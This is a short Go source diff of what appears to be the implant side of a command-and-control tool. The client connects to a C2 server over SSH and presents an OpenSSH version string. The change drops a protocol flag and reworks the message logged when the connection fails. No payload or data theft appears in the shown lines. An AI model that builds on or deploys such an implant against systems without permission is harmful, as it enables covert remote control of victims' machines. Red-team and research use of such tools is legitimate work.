@@ -26,11 +26,10 @@ import (
 )
 
 var (
-	ServerProto = "ssh"
-	ServerAddr  string
-	ServerFP    string
-	PrivKey     string
-	SSHVersion  = "SSH-2.0-OpenSSH_8.6"
+	ServerAddr string
+	ServerFP   string
+	PrivKey    string
+	SSHVersion = "SSH-2.0-OpenSSH_8.6"
 
 	/* Signer is PrivKey, parsed. */
 	Signer ssh.Signer
@@ -45,12 +44,6 @@ var (
 )
 
 func main() {
-	flag.StringVar(
-		&ServerProto,
-		"protocol",
-		ServerProto,
-		"C2 `protocol`",
-	)
 	flag.StringVar(
 		&ServerAddr,
 		"address",
@@ -110,7 +103,11 @@ func main() {
 	/* Connect to the C2 server. */
 	cc, chans, reqs, err := ConnectToC2()
 	if nil != err {
-		Debugf("Error establishing SSH connection with C2: %s", err)
+		Debugf(
+			"Error establishing connection with C2 %s: %s",
+			ServerAddr,
+			err,
+		)
 		os.Exit(7)
 	}
 	C2ConnL.Lock()
